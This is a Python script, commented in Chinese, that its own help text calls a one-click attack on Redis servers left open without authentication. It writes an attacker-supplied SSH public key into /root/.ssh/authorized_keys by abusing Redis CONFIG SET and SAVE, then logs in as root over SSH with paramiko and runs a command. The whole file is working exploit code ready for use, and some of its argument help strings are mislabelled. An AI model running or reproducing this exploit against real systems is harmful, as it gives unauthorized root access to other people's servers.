#! /usr/bin/env python3
# _*_  coding:utf-8 _*_

import argparse

import paramiko
import redis

# ssh一键化执行命令
def SSHCommond(ip, port, user, passwd, shell, private_key):
    try:
        # 创建一个ssh对象
        ssh = paramiko.SSHClient()
        if private_key is not None and passwd is None:
            # 读取私钥
            private_key = paramiko.RSAKey.from_private_key_file(private_key)
            # 解决问题:如果之前没有，连接过的ip，会出现选择yes或者no的操作，
            # 自动选择yes
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            # 连接服务器
            ssh.connect(hostname=ip, port=port, username=user, pkey=private_key)
        elif passwd is not None and private_key is None:
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname=ip, port=port, username=user, password=passwd)
        else:
            return '格式错误,请重新输入'
        # 执行操作
        stdin, stdout, stderr = ssh.exec_command(shell)
        # 获取命令执行的结果
        str1 = stdout.read().decode('utf-8')
        return str1
    except paramiko.ssh_exception.AuthenticationException:
        print("认证失败")
    else:
        print("SSH连接命令执行成功")

# redis未授权漏洞利用
def RedisWeiShouQuan(ip, redis_port, public_key, ssh_port, private_key):
    r = redis.Redis(host=ip, port=redis_port)
    pk = ('\n\n' + open(public_key, "r").read() + '\n\n')
    r.set('xx', pk)
    r.config_set("dir", "/root/.ssh/")
    r.config_set("dbfilename", "authorized_keys")
    r.save()
    print(SSHCommond(ip=ip, port=ssh_port, user='root', passwd=None, shell='id', private_key=private_key))
    return '运行完成'

if __name__ == '__main__':

    # ip = '127.0.0.1'
    # redis_port = '6379'
    # public_key = './id_rsa.pub'
    # ssh_port = '22'
    # private_key = './id_rsa'
    # print(main.RedisWeiShouQuan(ip, redis_port, public_key, ssh_port, private_key))
    parser = argparse.ArgumentParser(description='Redis未授权访问一键攻击。\nssh公/私钥可使用root用户"ssh-keygen -t rsa"命令生成，在/root/.ssh目录下。\n若id获取成功，可使用"ssh root@ip -p ssh_port -i private_key"进行连接目标')
    parser.add_argument('ip', type=str, help='目标ip地址')
    parser.add_argument('redis_port', type=int, help='目标redis端口号,一般是6379')
    parser.add_argument('public_key', type=str, help='ssh公钥')
    parser.add_argument('ssh_port', type=str, help='用户密码')
    parser.add_argument('private_key', type=str, help='执行的命令')
    args = parser.parse_args()

    print(RedisWeiShouQuan(ip=args.ip, redis_port=args.redis_port, public_key=args.public_key, ssh_port=args.ssh_port, private_key=args.private_key))
